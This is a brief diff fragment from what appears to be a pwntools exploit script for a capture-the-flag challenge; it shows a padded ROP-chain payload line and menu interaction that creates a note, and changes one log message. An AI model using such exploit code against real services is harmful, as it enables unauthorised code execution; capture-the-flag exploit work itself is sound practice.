@@ -27,7 +27,7 @@ payload = b"B"*100 + ropchain
 
 p.recvuntil(b"Invalid choice")
 
-log.info("Creating note with shellcode")
+log.info("Creating note with ropchain")
 p.recvuntil(b"Quit")
 p.sendline(b"1")
 p.recvuntil(b"Note ID:")
